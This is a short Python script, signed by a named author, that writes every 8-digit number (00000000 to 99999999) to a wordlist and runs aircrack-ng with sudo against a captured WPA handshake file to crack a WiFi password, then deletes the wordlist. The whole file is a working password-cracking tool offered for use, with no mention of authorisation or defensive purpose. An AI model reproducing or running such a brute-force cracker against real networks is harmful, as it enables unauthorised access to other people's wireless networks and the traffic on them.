print("==============================================")
print("||                                           ||")
print("||  Anouar Zeklat's WiFi Password Cracker    ||")
print("||  Handshake File Analyzer                  ||")
print("||                                           ||")
print("==============================================")

import os
import subprocess

# This script generates a wordlist file containing all possible 8-digit numbers (00000000 to 99999999)
# and uses it to test against a capture file with aircrack-ng. The wordlist file is then deleted.

# Function to generate passwords and write them to a temporary wordlist file
def generate_passwords_and_write_to_file(start, end, wordlist_file):
    print(f"Generating passwords from {start:08} to {end-1:08} and writing to {wordlist_file}")
    with open(wordlist_file, 'w') as f:
        for i in range(start, end):
            password = f"{i:08}"
            f.write(password + "\n")
            if i % 1000000 == 0:
                print(f"Generated {i - start} passwords so far...")

def run_aircrack_ng(pcap_file, wordlist_file):
    print(f"Running aircrack-ng on {pcap_file} with wordlist {wordlist_file}")
    command = ["sudo", "aircrack-ng", pcap_file, "-w", wordlist_file]
    subprocess.run(command)
    print("aircrack-ng process completed")

def main():
    pcap_file = "handshake_file.cap"
    wordlist_file = "temp_wordlist.txt"

    # Generate passwords from 00000000 to 99999999
    print("Starting password generation")
    generate_passwords_and_write_to_file(0, 100000000, wordlist_file)
    print("Password generation completed")

    # Run aircrack-ng with the generated wordlist
    print("Starting aircrack-ng")
    run_aircrack_ng(pcap_file, wordlist_file)

    # Clean up the temporary wordlist file
    print(f"Removing temporary wordlist file {wordlist_file}")
    os.remove(wordlist_file)
    print("Temporary wordlist file removed")

if __name__ == "__main__":
    main()

print("==============================================")
print("||                                           ||")
print("||  Script completed. Thank you for using!  ||")
print("||                                           ||")
print("==============================================")
print("WiFi Password Cracker Script by Anouar Zeklat.")
